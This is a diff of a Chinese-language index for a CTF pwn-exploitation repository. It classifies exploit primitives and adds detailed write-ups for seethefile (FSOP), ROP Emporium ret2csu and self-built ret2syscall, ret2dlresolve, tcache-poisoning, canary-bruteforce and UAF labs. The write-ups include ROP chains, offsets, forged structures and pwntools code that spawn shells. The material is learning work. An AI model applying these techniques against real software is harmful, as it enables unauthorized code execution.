@@ -7,13 +7,16 @@
 
 ## 1. 分类原则
 
-本仓库目前按十一类利用原语（exploit primitive）划分：
+本仓库目前按十七类利用原语（exploit primitive）划分：
 
 | 模式目录 | 共同模式特征 | 判定核心 |
 | --- | --- | --- |
 | `network_interaction_free_shell` | 网络交互 / 白给 Shell | 程序自身执行 `system("/bin/sh")` 或 `execve("/bin/sh")`，没有可控输入点，利用只发生在网络层 |
 | `ret2text` | 栈溢出 + ret2text | 覆盖 saved RIP，跳转到二进制 `.text` 内已有的后门函数或代码片段 |
 | `ret2libc` | 栈溢出 + leak libc | 覆盖 saved RIP，先 leak libc 地址，再返回 libc 的 `system("/bin/sh")` |
+| `ret2csu` | 缺传参 gadget → `__libc_csu_init` | 没有 `pop rdx`（或 `pop rsi`），用 `pop rbx/rbp/r12/r13/r14/r15; ret` + `mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]` 补齐参数 |
+| `ret2syscall` | 无 libc → 自己摆 syscall | 静态/无 libc，但有 `pop eax/ebx/ecx/edx` + `int 0x80`（或 `syscall`），直接拼 `execve` |
+| `ret2dlresolve` | 无 `system` → 伪造 ELF 让链接器解析 | 动态链接但导入表里没有 `system`/`execve`，可写已知地址 → 伪造 `Elf_Rel`/`Elf_Sym` + `plt0` |
 | `ret2shellcode` | 可执行内存 + shellcode | NX 关闭（`GNU_STACK=RWE`），leak 可执行内存地址后把 shellcode 写进去并跳转 |
 | `stack_pivot` | 栈空间不足 → 换栈 | 溢出字节数装不下 ROP 链，用 `xchg rsp,rax` / `leave;ret` 把栈迁到堆 / `.bss` / mmap 再执行长链 |
 | `sandbox_seccomp` | seccomp 沙箱 + ORW | 程序用 `prctl` 装 BPF 过滤，`execve` 被拦；只能 `open`+`read`+`write` 把 flag 读出来 |
@@ -21,33 +24,55 @@
 | `format_string_write` | 格式化字符串任意写 | `printf(user_input)`，用 `%n` 改全局变量 / GOT / 返回地址 |
 | `stack_local_var_overwrite` | 栈溢出改局部变量 / 条件绕过 | 只覆盖与缓冲区相邻的局部变量，使条件判断成立，不控制 RIP |
 | `heap_uaf` | 释放后使用 | free 后指针仍被引用，重新分配旧对象，改写函数指针 / vtable / 控制流 |
+| `tcache_poisoning` | 改写 tcache 链 | 有 UAF（或 double free）可改已释放 chunk 的 `next`，把下一次 `malloc` 顶到任意地址；glibc ≥ 2.32 需先泄 `chunk>>12`（safe-linking），2.34+ 目标改 `.bss` 函数指针 / `exit_funcs` 等 |
+| `canary_bruteforce` | canary 逐字节爆破 | 有 canary + 溢出长度足够 + 每次连接重启（fork server）→ 逐字节试错，判据是进程是否正常返回 |
 | `heap_exploitation` | 堆布局 / 分配器元数据 | 利用堆溢出、fastbin/unsorted bin、对象指针或分配器 hook 达成任意写 / 控制流 |
+| `fsop` | 伪造 `_IO_FILE` / vtable | 可控 `FILE *`（或 `_IO_list_all`）+ 能把二进制写进已知地址 → 伪造 `_IO_FILE`，借 `fclose` / `exit` 走到 libc 的 `_IO_str_finish` 等槽位 |
 
 判定顺序：
 
 ```text
 0. 是否装了 seccomp 沙箱（`prctl(PR_SET_SECCOMP)` + `.rodata` 里的 BPF 数组）？
-   └─ 是 → 目标改成 ORW；落地方式继续按 3~6 判断（shellcode / ROP / pivot）
+   └─ 是 → 目标改成 ORW；落地方式继续按 3~7 判断（shellcode / ROP / pivot）
 1. 有没有可控输入 / 内存破坏点？
    └─ 没有，且程序直接给 shell → network_interaction_free_shell
 2. 输入是否被直接传给 printf？
    └─ 是 → format_string_write
 3. NX 是否关闭（`GNU_STACK=RWE`），且能拿到可执行内存的地址？
    └─ 是 → ret2shellcode
-4. 有 `syscall; ret` + `pop rax; ret`，但缺 `pop rdi/rsi/rdx`（或根本没有 libc）？
+4. 是否存在可控的 `FILE *` / `_IO_list_all`（程序自己 `fopen/fread/fclose`，或能写全局 `fp`）？
+   └─ 是 → fsop（伪造 `_IO_FILE`，vtable 用 libc 的 `_IO_str_jumps` / `_IO_file_jumps`）
+5. 有 `syscall; ret` + `pop rax; ret`，但缺 `pop rdi/rsi/rdx`（或根本没有 libc）？
    └─ 是 → srop（`rax=15` + `syscall` 触发 `rt_sigreturn`）
-5. 溢出的目标是 saved RIP 吗？
+6. 有 `__libc_csu_init` 的长 pop 序列（`rbx/rbp/r12/r13/r14/r15`）+ `call [r12+rbx*8]`，
+   但缺 `pop rdx` / `pop rsi`（或目标函数要三个参数）？
+   └─ 是 → ret2csu（第一参要求完整 64 位时，让 csu 只负责 rdx，再用 pop rdi/rsi 补前两参）
+7. 二进制是静态链接 / 根本没有 libc，但有 `pop eax/ebx/ecx/edx` + `int 0x80`（或 `syscall`）？
+   └─ 是 → ret2syscall（自己摆 `execve` 的 filename/argv/envp）
+8. 二进制动态链接、导入表里没有 `system`/`execve`，但有 `read`/`puts` 且能写已知地址？
+   └─ 是 → ret2dlresolve（伪造 `Elf_Rel`/`Elf_Sym`/符号名 + 调 `plt0`；先看架构与 glibc 版本）
+9. 溢出的目标是 saved RIP 吗？
    ├─ 是，但可用字节数不足以放下完整 ROP 链 → 先 stack_pivot
    ├─ 是，且跳转到二进制内已有代码 → ret2text
    ├─ 是，但需要 leak libc 才能调用 system → ret2libc
    └─ 否，只是改相邻局部变量 → stack_local_var_overwrite
-6. 漏洞在堆上吗？
-   ├─ free 后指针仍被引用，可重占旧对象 → heap_uaf
+10. 溢出目标是 saved RIP，且开了 canary、又没有任何泄漏点（`printf("%s")` / 回显）？
+   └─ 是，且服务每次连接重启（fork server）→ canary_bruteforce（逐字节试，LSB 恒为 `\x00`）
+11. 漏洞在堆上吗？
+   ├─ free 后指针仍被引用，可重占旧对象改函数指针 → heap_uaf
+   ├─ 已释放 chunk 的 `next` 可控（UAF / double free）→ tcache_poisoning
    └─ 需要操纵堆布局 / 分配器元数据 / 相邻对象指针 → heap_exploitation
 ```
 
 > 第 0 条是"横切关注点"：seccomp 不改变落地原语，只把最终目标从 `getshell`
 > 换成 `open/read/write`（`sandbox_seccomp`）。
+>
+> 第 4 条（`fsop`）排在堆题之前：只要 `FILE *` 可写，就不必碰分配器元数据；
+> 判定时先看程序有没有 `fopen/fread/fclose` 和可控 `fp`，再决定是否走 heap 路线。
+>
+> 第 6~8 条（`ret2csu` / `ret2syscall` / `ret2dlresolve`）是"传参能力不足"的三种补法：
+> 缺 gadget 用 csu 补、没 libc 用 syscall 自己拼、没 `system` 用动态链接器去解析。
+> 它们与 `ret2text`/`ret2libc` 互斥：能直接 `pop rdi` + 调 `system` 时不需要绕。
 
 ---
 
@@ -83,7 +108,14 @@
 | 26 | `card` | tcache 1 字节溢出 + overlap + hook / 64 位 | `heap_exploitation` | unsorted bin 泄 `main_arena`；1 字节把 `B.size` 从 `0x21` 改成 `0x91` 造 overlap，伪造两个合法 `0x20` 块 free 进 tcache，改 `C2->fd = __free_hook`，写 `system` 后 `free("/bin/sh")` | `__free_hook=libc+0x3ED8E8`、`system=libc+0x4F440` | `arena = __malloc_hook+0x70`、A 用 `0xA8` 让溢出点贴住 `B.size` |
 | 27 | `jarvisoj_http` | 逐字节读请求 + CSU ROP / 64 位 No PIE | `ret2text` | `read_request` 逐字节读到 `\r\n\r\n` 无长度上限；栈上计数器 `cnt` 位于 `buf+0x20C`，直接打满会自覆盖回卷，需先用 `0x0F/0x00` 把它顶过 `0x210`；CSU 链 `read(4,CMD,0x400)` → `popen(CMD,"r")` → `waitpid`，`sh <&4 >&4 2>&4` 绑到 socket | saved RIP 在字节流 **0x216** | `CSU_POP=0x4015AA`、`CSU_CALL=0x401590`、`CMD=0x601E00`、`RSTR=0x601E80`、`popen@got=0x601C80`、端口 `htons(0x70f)=3847` |
 | 28 | `canary3` | canary 泄漏 + ret2libc / 64 位 PIE | `ret2libc` | 登录函数 `pw[n]=0` 且 `n` 可取 `0x20` → 打到 `hex@rbp-0x30` 首字节，`strcmp(md5(pw), hex)` 退化为“digest 首字节为 0”；菜单 `printf("%s", buf)` 两轮泄漏 canary + saved RIP，第三轮 ret2libc | 主函数 **0x28**（canary 0x18） | `buf=rbp-0x20`、canary `rbp-0x8`、口令 32 字节且 `md5(pw)[0]==0`、`read` 上限 `0x64` |
+| 29 | `pwnable.tw seethefile` | FSOP / 伪造 `_IO_FILE` + `_IO_str_finish` / 32 位 | `fsop` | 隐藏菜单 5 的 `scanf("%s", name)` 溢出到全局 `fp`；`fopen("/dev/stdin")` + `fread` 把带 `\0` 的假 `_IO_FILE` 灌进 `magicbuf`；`fclose(fp)` → `_IO_str_finish` → `_s._free_buffer("/bin/sh")` = `system` | `name` **0x20**（`+0x20` 即 `fp`） | `magicbuf=0x804b0c0`、`name=0x804b260`、`fp=0x804b280`、`_IO_str_jumps=libc+0x1b49c0`(2.24 i386)、`system=libc+0x3b020` |
 | L1 | `lab_srop_baby`（自造） | SROP / 64 位静态汇编 | `srop` | `read(0, rsp, 0x400)` 溢出；只有 `syscall;ret` + `pop rax;ret`，无传参 gadget 无 libc → `rax=15` 触发 `rt_sigreturn`，sigframe 直接 `execve("/bin/sh")` | **0**（read 直接写 rsp） | `syscall;ret=0x401065`、`pop rax;ret=0x401068`、`bss=0x403010` |
+| 30 | `ROP Emporium ret2csu` | 缺 `pop rdx` → `__libc_csu_init` 通用 gadget / 64 位 No PIE | `ret2csu` | `pwnme` 的 0x20 缓冲区溢出；`ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)` 三项都按 64 位比较；csu 的 `mov edi,r13d` 会截断第一参 → 让 csu 只负责 `rdx`（`call` 指向不碰 rdx 的 `frame_dummy`），再 `pop rdi` / `pop rsi` 补前两参，最后 `ret` 到 `ret2win@plt` | **0x28**（`rbp-0x20`） | `pop rdi=0x4006a3`、`pop rsi;pop r15=0x4006a1`、`csu_pop=0x40069a`、`csu_call=0x400680`、`r12=&frame_dummy=0x600df0`、`ret2win@plt=0x400510` |
+| L2 | `lab_ret2syscall_i386`（自造） | 纯 syscall ROP / 32 位静态 | `ret2syscall` | `read(0, esp, 0x400)` 溢出；`pop eax/ebx/ecx/edx` + `int 0x80` 自己拼 `execve("/bin/sh", NULL, NULL)`（先 `read` 把 `/bin/sh` 放进可写数据区） | **0**（read 直接写 esp） | `int80=0x8049050`、`pop eax=0x8049053`、`pop ebx=0x8049055`、`pop ecx=0x8049057`、`pop edx=0x8049059`、`bss_buf=0x804b010` |
+| L3 | `lab_ret2dlresolve_i386`（自造） | 伪造 ELF → 动态链接器解析 `system` / 32 位动态（仅导入 `read`） | `ret2dlresolve` | 栈溢出 → `read(0, dl.data_addr, len)` 把伪造的 `.dynstr/.dynsym/.rel.plt` 写进 bss → `plt0(reloc_offset)` → `_dl_fixup` 解析 `system` → `system("/bin/sh")` | **0**（read 直接写 esp） | `plt0=0x8049000`、`bss=0x804c010`、`data_addr=0x804ce00`、链 36B + payload 48B、glibc 2.24 i386 |
+| L4 | `lab_tcache_poisoning`（自造） | tcache poisoning / safe-linking / 64 位（glibc 2.43） | `tcache_poisoning` | `free` 不清空 `notes[]` → `show` 读队尾 `next` 得 `chunk>>12`（safe-linking key）→ `edit` 改队尾 `next = fh ^ key` → 3 次 `add` 让 `malloc` 落到 `.bss` 的 `fh`，写入 `backdoor` → `trigger` | N/A（堆） | `fh=0x4040a0`(16 对齐)、`backdoor=0x401296`、0x50 chunk、`__free_hook` 已不存在 |
+| L5 | `lab_canary_bruteforce`（自造） | canary 逐字节爆破 + ret2win / 64 位（fork server） | `canary_bruteforce` | 程序自带 `fork()` 循环（每次连接同 canary）；`read(0, buf, 0x100)` 溢出 `buf[0x40]`；LSB `\x00` 已知，其余 7 字节各试 ≤256 次，判据是子进程是否打印 `SURVIVED` | **0x48**（RIP 0x58） | `win=0x401256`、`ret` 垫片解决 16 字节对齐、单次约 900 fork ≈ 20 s |
+| L6 | `lab_heap_uaf`（自造） | 函数指针 UAF / 64 位（glibc 2.43） | `heap_uaf` | `struct note {data, fn}`，`free` 只释放不清空；data(0x18→0x20 chunk) 与 struct(0x20 chunk) 同 size class，两次 free 后 tcache 为 `S1,C,S0,A`，下一个 `add` 的 data 正好盖住旧 `struct note` → 改 `fn=backdoor` → `show(stale)` | N/A（堆） | `backdoor=0x401256`、tcache LIFO 顺序 `S1,C,S0,A`、`read_int` 必须逐字节读 |
 
 ---
 
@@ -934,6 +966,56 @@ main（菜单，buf=rbp-0x20，canary=rbp-0x8）：
 
 文档：`ret2libc/28_canary3_speedrun.md`；EXP：`28_canary3_exp.py`。
 
+### 3.29 `pwnable.tw seethefile` → `fsop`（伪造 `_IO_FILE` + `_IO_str_finish`）
+
+```text
+32 位 i386、No PIE、Partial RELRO、NX、Canary（与利用无关）、not stripped
+菜单 1.Open / 2.Read / 3.Write to screen / 4.Close / 5.Exit（5 是隐藏的名称输入分支）
+```
+
+判定依据：
+
+1. `openfile` 里 `fp = fopen(filename, "r")`，`fp` 是 `.bss` 全局（`0x804b280`），
+   而 `char name[0x20]`（`0x804b260`）紧贴它；隐藏分支 5 的 `scanf("%s", name)`
+   没有长度限制 → **唯一的内存破坏点就是 `fp` 指针本身**，没有栈/堆溢出
+   → 命中 §1 判定顺序第 4 条 `fsop`。
+2. `readfile` 是 `fread(magicbuf, 0x18F, 1, fp)`：长度固定、可重复调用，且
+   `magicbuf` 地址固定（`0x804b0c0`）→ 满足“把任意二进制写进已知地址”。
+3. `writefile` 的 `puts(magicbuf)` + “可打开任意文件” = 泄漏原语；它只拦
+   `filename` 含 `flag`、`magicbuf` 含 `FLAG` 或 `}`，`/proc/self/maps` 全部放行。
+
+三段式利用：
+
+```text
+1) fopen("/proc/self/maps") -> 反复 (2.Read + 3.Write) 每次吐 0x18F 字节
+   -> 拼出 "xxxx-xxxx r-xp 00000000 ... libc.so.6" -> libc base
+2) 4.Close；fopen("/dev/stdin") -> 2.Read 时 send(0x18F 字节假 _IO_FILE) -> magicbuf
+3) 5.Leave your name -> 'A'*0x20 + p32(0x804b0c0) -> fclose(fp) -> system("/bin/sh")
+```
+
+假 `_IO_FILE`（i386 / 2.24，`_IO_strfile` 视角）：`+0x00 flags=0xFBAD0000`、
+`+0x1c _IO_buf_base="/bin/sh"`、`+0x38 _fileno=-1`、`+0x48 _lock=缓冲区里清零的锁`、
+`+0x94 vtable=_IO_str_jumps`、`+0x9c _s._free_buffer=system`。
+
+关键细节（都是实测踩过的坑）：
+
+- `_IO_str_finish` 在 i386 上取 **`fp+0x9c`**（amd64 才是 `+0xe0`）；`fp+0x94` 同时是
+  `_IO_FILE_plus` 的 vtable 和 `_s._allocate_buffer`，两者刚好错开一个槽位。
+- 2.24 已有 `_IO_vtable_check`：vtable 必须落在 `__libc_IO_vtables` 段内，自造 vtable 会
+  abort，所以只能用 libc 里的真表。`_IO_str_jumps` 偏移随版本变化，EXP 在
+  `__libc_IO_vtables` 里用「`_IO_str_finish` 读 `+0x1c` 且 `call [reg+0x9c]`」+
+  「`_IO_str_overflow` 开头 `test al,0x8`」唯一命中（2.24-3ubuntu2.2 i386 = `0x1B49C0`）。
+- `flags & 0x1`（`_IO_USER_BUF`）必须为 0，否则 `_IO_str_finish` 跳过回调；但
+  `0xFBAD0000` 自带 `_IO_LINKED | _IO_IS_FILEBUF`，于是 `fclose` 会先 `_IO_un_link`
+  再 `_IO_file_close_it`（靠 `_fileno=-1` 让它立刻返回）；`_IO_un_link` 清掉
+  `_IO_LINKED` 后 `fclose` 走加锁分支，因此 `_lock` 必须是可解引用的地址。
+- `scanf` 的 stdio 缓冲会吞 blob：`sendline("2")` 之后 `sleep(0.3)` 再发 0x18F 字节。
+- 名字 payload 必须自带 `\n`，否则 `scanf("%s")` 会把随后的 shell 命令一起吞进 stdio
+  缓冲，`system("/bin/sh")` 之后的 sh 读不到输入（表现为“拿到 shell 却无回显”）。
+
+实测与文档：`fsop/29_pwnable_tw_seethefile_speedrun.md`；
+EXP：`fsop/29_pwnable_tw_seethefile_exp.py`（本地 3/3，拿到 `uid=1000` 的 shell）。
+
 ### 3.L1 `lab_srop_baby` → `srop`（自造实验）
 
 ```text
@@ -984,6 +1066,261 @@ ret -> pop rax (=15) -> ret -> syscall  ==> rt_sigreturn
 - sigframe 的 `rsp` 别指向 bss 开头（会被 "/bin/sh" 占用的 8 字节影响观感），
   习惯性放到 `bss+0x80`。
 
+### 3.30 `ROP Emporium ret2csu` → `ret2csu`（缺 `pop rdx` 的通用 gadget）
+
+```text
+64 位 amd64、No PIE（0x400000）、NX、无 canary、Partial RELRO、not stripped
+主程序只导入 pwnme / ret2win（都在 libret2csu.so 里，RUNPATH=b'.'）
+pwnme: read(0, rbp-0x20, 0x200)     → 溢出偏移 0x28
+ret2win(a,b,c): a==0xdeadbeefdeadbeef, b==0xcafebabecafebabe, c==0xd00df00dd00df00d
+                三项都是 movabs + cmp QWORD（截断成 32 位直接失败）
+```
+
+可用 gadget（`ROPgadget`）：
+
+```text
+0x4006a3  pop rdi ; ret                    ← 藏在 csu 的 pop 序列里（41 5f c3 取第 2 字节）
+0x4006a1  pop rsi ; pop r15 ; ret
+0x40069a  pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x400680  mov rdx,r15 ; mov rsi,r14 ; mov edi,r13d ; call [r12+rbx*8]
+          add rbx,1 ; cmp rbp,rbx ; jne 0x400680
+          add rsp,8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+没有 pop rdx
+```
+
+判定依据：
+
+1. 有栈溢出（`read` 0x200 进 0x20 缓冲区）。
+2. 缺 `pop rdx` 但存在 `__libc_csu_init` 的长 pop 序列 + `call [r12+rbx*8]`
+   → 命中 §1 判定顺序第 6 条 `ret2csu`。
+3. 目标函数三个参数、第一参是真正的 64 位常量 → 不能直接用标准两段式。
+
+关键坑（本题的核心）：`mov edi, r13d` 是 **32 位写**，会把 rdi 高 32 位清零。
+如果按教科书链 `csu_pop(r12=ret2win@got, r13=0xdeadbeefdeadbeef) -> csu_call`，
+`ret2win` 拿到的是 `0x00000000deadbeef`，第一项检查就失败。
+
+本仓库的解法：**让 csu 只负责 `rdx`**，把 `call [r12+rbx*8]` 指向一个
+“不碰 rdx 的无害函数”，gadget 走完 epilogue 后 rdx 存活，再用 pop 补前两参：
+
+```text
+r12 = 0x600df0 (.init_array[0]) -> 0x400600 frame_dummy
+      frame_dummy -> register_tm_clones：只用 rax/rsi/rdi/rbp，不写 rdx，
+      末尾 pop rbp ; ret 回到 0x40068d 继续 add rbx,1 / 收尾
+```
+
+完整链：
+
+```text
+'A'*0x28
+csu_pop(0x40069a)
+    rbx = 0                 # call [r12+0]
+    rbp = 1                 # 循环一轮后退出
+    r12 = 0x600df0          # &frame_dummy
+    r13 = 0                 # edi
+    r14 = 0                 # rsi
+    r15 = 0xd00df00dd00df00d# rdx ★
+csu_call(0x400680)
+    0 * 7                   # add rsp,8 + pop rbx/rbp/r12/r13/r14/r15
+pop rdi ; 0xdeadbeefdeadbeef
+pop rsi ; pop r15 ; 0xcafebabecafebabe ; 0
+ret2win@plt(0x400510)       # GOT 未解析也没关系，PLT 自己会 _dl_runtime_resolve
+```
+
+其它坑：
+
+- **`call [r12+rbx*8]` 是内存间接调用**：`r12` 必须是“指针的地址”（GOT 项 /
+  `.init_array` 项）。直接放 `xxx@plt` 会把 PLT 指令字节当地址 → 崩。
+- epilogue 要垫 **7 个 qword**（`add rsp,8` + 6 个 pop）才轮到返回地址。
+- 无害跳板不能选 `pwnme` / `puts` / `printf` 这类会进 libc 的函数——它们会破坏 rdx。
+
+实测与文档：`ret2csu/README.md`、`ret2csu/30_ropemporium_ret2csu_speedrun.md`；
+EXP：`ret2csu/30_ropemporium_ret2csu_exp.py`（本地输出 `ROPE{a_placeholder_32byte_flag!}`）。
+
+### 3.L2 `lab_ret2syscall_i386` → `ret2syscall`（自造实验）
+
+```text
+i386、静态（as --32 + ld -m elf_i386，无 libc / 无 crt）、ET_EXEC（0x8048000）
+NX 开启（PT_GNU_STACK=RW）、无 canary、No RELRO
+gadget：0x8049050 int 0x80;ret、0x8049053 pop eax;ret、0x8049055 pop ebx;ret、
+        0x8049057 pop ecx;ret、0x8049059 pop edx;ret
+可写区：0x804b010（.data，0x100 字节）
+```
+
+程序逻辑（`labs/lab_ret2syscall_i386/src/chal.S`）：
+
+```text
+write(1, "name: ", 6)            # int 0x80, eax=4
+read(0, 0x804b010, 8)            # eax=3，正好放 "/bin/sh\0"
+write(1, "exploit: ", 9)
+read(0, esp, 0x400)              # 栈溢出，缓冲区就是当前栈顶
+ret                              # 返回地址直接取 [esp]
+```
+
+判定依据：静态链接（没有 libc / `system` / `/bin/sh`）→ 排除 ret2libc；
+NX 开启 → 排除 ret2shellcode；有 `pop eax/ebx/ecx/edx` + `int 0x80`
+→ 命中 §1 判定顺序第 7 条 `ret2syscall`。
+
+利用链（偏移 **0**）：
+
+```text
+name 阶段："/bin/sh\0" -> 0x804b010
+exploit 阶段：
+  pop eax ; 11          # __NR_execve
+  pop ebx ; 0x804b010   # filename
+  pop ecx ; 0
+  pop edx ; 0
+  int 0x80
+```
+
+坑点（本次实测踩到的）：
+
+- **i386 的 `read` 系统调用号是 3**，不是 0。写 `xor eax,eax; int 0x80` 会调
+  `restart_syscall`，返回 `-EINTR`（现象：两个提示立刻打完就崩）。
+- 裸 `ld` 生成的 `.bss` LOAD 头可能不满足 `p_vaddr ≡ p_offset (mod 0x1000)`
+  （实测 `Offset=0x10 / Vaddr=0x804b010`），内核不映射 → `read` 返回 `-EFAULT`。
+  所以可写区放 `.data`（文件映射），并用 `.balign 16` 固定地址。
+- 必须写 `.section .note.GNU-stack,"",@progbits`，否则栈可能被标成可执行。
+
+实测与文档：`labs/lab_ret2syscall_i386/README.md`；EXP：同目录 `exp.py`（输出 `__PWNED__`）。
+
+### 3.L3 `lab_ret2dlresolve_i386` → `ret2dlresolve`（自造实验）
+
+```text
+i386、动态链接（glibc 2.24 i386，归档在 libc/）、Partial RELRO、NX、无 canary
+导入符号：只有 read（.dynsym/.dynstr/.rel.plt 与 PLT0 都在，但没有 system）
+plt0 = 0x8049000、bss = 0x804c010、dl.data_addr = 0x804ce00
+chal: sub esp,0x200 ; read(0, esp, 0x200) ; ret     → 溢出偏移 0
+```
+
+判定依据：动态链接但导入表没有 `system`/`execve`，也没有泄漏点 → 排除 ret2libc；
+NX → 排除 ret2shellcode；有 `read` + 可写已知地址（bss）→ 命中 §1 判定顺序
+第 8 条 `ret2dlresolve`。
+
+利用（pwntools 生成，不需要手写结构）：
+
+```python
+rop = ROP(elf)
+dl  = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
+rop.read(0, dl.data_addr)    # 第二段：伪造结构写进 bss
+rop.ret2dlresolve(dl)        # plt0(reloc_offset) -> _dl_runtime_resolve -> system
+```
+
+链长 **36 字节**，伪造结构 **48 字节**（`/bin/sh\0` + `Elf32_Sym` + `Elf32_Rel`）。
+
+原理与版本差异（本 lab 与 §5.6 负结果的对照）：
+
+```c
+_dl_fixup():  symtab = DT_SYMTAB + symidx*sizeof(Elf_Sym)
+              strtab = DT_STRTAB + sym->st_name
+              reloc  = DT_JMPREL + reloc_offset
+              if (l->l_info[DT_VERSYM]) ndx = versym[symidx] & 0x7fff;  // ← 越界读
+```
+
+伪造符号必须放在真实 `.dynsym` 之后很远的地方 → `symidx` 很大 →
+`versym[symidx]` 越界。**i386 小二进制**里这个越界地址仍落在已映射的
+`.bss`/`.data` 上（读到 0，版本检查跳过）→ 成功；x86_64 + 新 glibc 上容易
+打到未映射页 → `SIGSEGV`（`pwnable.tw unexploitable` 的负结果）。
+
+坑点：
+
+- `chal` 的 `interpreter` 写成相对路径 `./libc/ld-2.24.so`、`RUNPATH=$ORIGIN/libc`，
+  所以在 lab 目录里直接 `./chal` 就能跑，不依赖系统 32 位 loader。
+- 两段发送之间要留延迟（第二段 `read` 是链里的第一条 gadget，太急会被第一段吞掉）。
+- 链里 `read@plt` 的返回地址是垃圾值（`0xdeadbeef`），但 `ret2dlresolve` 不会返回。
+
+实测与文档：`labs/lab_ret2dlresolve_i386/README.md`；EXP：同目录 `exp.py`（输出 `__PWNED__`）。
+
+### 3.L4 `lab_tcache_poisoning` → `tcache_poisoning`（自造实验）
+
+为什么造这个 lab：真实题里 `__free_hook` 是最顺手的 tcache 目标，但 **glibc 2.34 已经把它删掉**，
+本机是 2.43，所有“改 `__free_hook` 打 `system`”的老 writeup 在这台机器上都不可复现。
+所以造一个目标换成 `.bss` 函数指针的最小靶子，把 safe-linking 这一步单独练干净。
+
+程序逻辑（`labs/lab_tcache_poisoning/src/chal.c`）：
+
+```text
+add   : malloc(size)，定长 read 入 data
+edit  : read(0, notes[i], sizes[i])     ← free 之后照样能写
+free  : free(notes[i])，不清空 notes[i]  ← UAF 的根因
+show  : write(1, notes[i], sizes[i])    ← free 之后照样能读（泄 next）
+trigger: if (fh.fn) fh.fn();            ← 被劫持的目标
+```
+
+判定依据：
+
+- 只有 UAF，没有 double free → 避开 2.29+ 的 `tcache_entry.key` 检测。
+- 泄漏点 = 队尾 chunk 的 `next`：`enc = 0 ^ (chunk>>12)`，直接就是 safe-linking key。
+- 目标 = 16 字节对齐的 `struct fake_hook fh`（`__attribute__((aligned(16)))`），
+  `tcache_get()` 会检查 `aligned_OK` 并回写 `e->key = 0`，所以 `fh` 后面留了 `pad[0x38]`。
+
+关键数据（本机 gcc 2.43，`exp.py` 用 `ELF().symbols` 取，不写死）：
+
+```text
+fh       0x4040a0
+backdoor 0x401296
+```
+
+实测与文档：`labs/lab_tcache_poisoning/README.md`；EXP：同目录 `exp.py`（输出 `__PWNED__`）。
+
+### 3.L5 `lab_canary_bruteforce` → `canary_bruteforce`（自造实验）
+
+为什么造这个 lab：本案 `28_canary3`、`18_repeater` 都是**泄漏** canary；一旦程序既开 canary
+又没有任何回显点，就只能靠 **fork server 复用同一 canary** 逐字节试错。这条路径在本仓库
+此前没有被独立验证过，所以单独造靶子跑通。
+
+程序逻辑（`labs/lab_canary_bruteforce/src/chal.c`）：
+
+```text
+main: while (1) { fork(); 子进程: vuln(); puts("SURVIVED"); _exit(0); waitpid(...); }
+vuln: char buf[0x40]; read(0, buf, 0x100);   ← canary 在 buf 之后
+```
+
+判定依据：
+
+- 判据是 **`SURVIVED` 是否出现**，不是提示符：父进程总会 fork 下一个子进程并再打印 `payload: `。
+- canary 最低字节恒为 `\x00`，所以只爆 7 字节；期望约 900 次连接，实测约 20 s。
+
+关键数据：
+
+```text
+win      0x401256
+偏移     0x48 到 canary，0x58 到 saved RIP
+```
+
+坑点（实测）：直接 `ret` 到 `win` 时 `rsp % 16 == 0`，而 `win` 里第一次调 `system@plt`
+要走 `_dl_runtime_resolve`（call 语义要求 `rsp % 16 == 8`）→ 现象是提示语打出来了但 flag
+不输出。payload 里先垫一个 `ret` gadget 即可。
+
+实测与文档：`labs/lab_canary_bruteforce/README.md`；EXP：同目录 `exp.py`（输出 `__PWNED__`）。
+
+### 3.L6 `lab_heap_uaf` → `heap_uaf`（自造实验）
+
+为什么造这个 lab：`heap_uaf` 这类原本只有 `14_hitcontraining_uaf` 一道真实题，样本太薄；
+本轮想补第二道真实题（`pwnable.tw hacknote`），但见 §5.7 的负结果，于是改成造一个
+**确定性、不依赖泄漏**的最小靶子，把“重占旧结构体 → 改函数指针”这一步单独练。
+
+程序逻辑（`labs/lab_heap_uaf/src/chal.c`）：
+
+```text
+struct note { char *data; void (*fn)(char *); };    ← 成员顺序：data 在前
+add : d = malloc(size); read(d); n = malloc(16); n->data=d; n->fn=print_note;
+free: free(notes[i]->data); free(notes[i]);          不清空 notes[i]
+show: notes[i]->fn(notes[i]->data)                   ← 调 stale 函数指针
+```
+
+判定依据：
+
+- `size=0x18` 的 data 与 16 字节 `struct note` 都是 `0x20` chunk → 同一个 tcache bin。
+- 两次 free 后 tcache 为 `S1, C, S0, A`；下一个 `add` **先分配 data**，拿到队首 `S1`（旧 note1 的结构体）
+  → 直接写 `{arg, fn}`，再 `show(1)` 就走 `backdoor`。
+
+坑点（实测）：
+
+- 成员顺序写反（`{fn, arg}`）会崩在 `call 0x0`，且参数寄存器里是被当成 data 的 `backdoor` 地址。
+- 菜单 `read_int()` 必须**逐字节读到 `\n`**，`read(0,b,15)` 会吞掉后续输入导致 desync。
+
+实测与文档：`labs/lab_heap_uaf/README.md`；EXP：同目录 `exp.py`（输出 `__PWNED__`）。
+
 ---
 
 ## 4. 仓库结构映射（重构前 → 重构后）
@@ -1015,7 +1352,14 @@ ret -> pop rax (=15) -> ret -> syscall  ==> rt_sigreturn
 | pwnable.tw `orw`（外部下载，`_vendor/orw`） | `sandbox_seccomp/23_pwnable_orw_*`、`sandbox_seccomp/orw`、`sandbox_seccomp/make_local_exec.py` |
 | V&N 2022 校赛 `easyROPtocol`（附件目录 `easyROPtocol/`） | `sandbox_seccomp/24_easyroptocol_*`、`sandbox_seccomp/easyroptocol`、`sandbox_seccomp/libc-2.31.so` |
 | 33C3 CTF 2016 `rec` + 下载的 i386 glibc 2.24 | `ret2libc/25_rec_33c3_2016_*`、`ret2libc/rec_33c3_2016`、`ret2libc/libc-2.24.so` |
+| pwnable.tw `seethefile`（外部下载，`_vendor/seethefile`） | `fsop/29_pwnable_tw_seethefile_*`、`fsop/seethefile` |
+| ROP Emporium `ret2csu`（外部下载，`ropemporium.com/binary/ret2csu.zip`） | `ret2csu/30_ropemporium_ret2csu_*`、`ret2csu/ret2csu`、`ret2csu/libret2csu.so`、`ret2csu/key.dat`、`ret2csu/encrypted_flag.dat` |
+| （无原始附件，自造） | `labs/lab_ret2syscall_i386/`：`src/chal.S`、`Makefile`、`chal`、`exp.py`、`README.md` |
